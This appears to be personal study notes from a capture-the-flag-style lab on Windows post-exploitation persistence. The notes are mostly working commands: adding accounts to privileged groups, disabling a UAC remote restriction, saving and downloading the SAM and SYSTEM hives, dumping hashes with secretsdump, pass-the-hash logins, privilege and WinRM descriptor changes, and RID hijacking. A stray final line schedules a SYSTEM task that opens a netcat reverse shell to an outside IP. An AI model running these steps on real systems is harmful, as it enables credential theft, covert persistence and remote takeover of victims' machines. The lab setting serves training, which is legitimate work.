#cybersecurity #penetration-test #windows 

To make it harder for the blue team to detect us, we can manipulate unprivileged users, wich usually won't be monitored as much as administrators

We assume we have already gained administrative access somehow and are trying to establish persistence from there

### Assign Group Memberships

We will assume we have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group.

```cmd
net localgroup administrators thmuser0 /add
```

If this looks too suspicious, you can use the Backup Operators group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured [[DACL]]. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

```
net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account , it cannot RDP or WinRM back to the machine unless we add it to **Remote Desktop Users** or **Remote Management Users**

```
net localgroup "Remote Management Users" thmuser1 /add
```

But if we try to connect with WinRM or RDP, we can see that we are not able to access all files as expected
Quick check

```bash
evil-winrm -i 10.10.238.37 -u thmuser1 -p Password321
```

This is due to UAC (User Account Control) and it's feature **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely

To disable, we have to modify a registry key

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Let's enter now in the server

```bash
evil-winrm -i 10.10.238.37 -u thmuser1 -p Password321
```

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

We those files we can dump the password hashes for all users using `secretsdump.py`

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

And finally perform PASS-THE-HASH to connect to the victim machine with privileges

```
user@AttackBox$ evil-winrm -i 10.10.238.37 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```




### Special Privileges and Security Descriptors
A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found here for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

- **SeBackupPrivilege**: The user can read any file in the system, ignoring any DACL in place.
- **SeRestorePrivilege**: The user can write any file in the system, ignoring any DACL in place.


We can assign such privileges to any user, independent of their group memberships. To do so, we can use the **secedit** command. First, we will export the current configuration to a temporary file:

```
secedit /export /cfg config.inf
```

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![[ADprivileges.png]]

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:dir

```
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a security descriptor as an ACL but applied to other system facilities.

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![[full-control.png]]


### RID Hijacking
We can change some registry values to make the operating system think we are Administrator

When user is create, an identifier called Relative ID (RID) is assigned to them. It's simply a numeric identifier representing the user across the system.

When an user logs on, the LSASS process gets its RID form the SAM registry hive and creates an access token associated with that RID, If we can tamper with the registry value, we can make windows assign an Administrator access token RID=500 

To find the assigned RID
```cmd
wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

The RID is the last bit of the SID
SID it's and identifier that allows the operating system to identify a user across a domain

Now we assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it.
To run regedit as SYSTEM, we will user psexec

```poweshell
PsExec64.exe -i -s regedi
```

Now we go to `HKLM\SAM\SAM\Domains\Account\Users`
Here there is a key for each user in the machine
Since we want to modify thmuser3 we need to find a key with RID in hex 1010 = 0x3F2
There will be a value F wich holds the user's effective RID at position 0x30
![[RID.png]]


The RID is stored in little-endian notation, so its bytes appear reversed.

schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.9.4.183 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.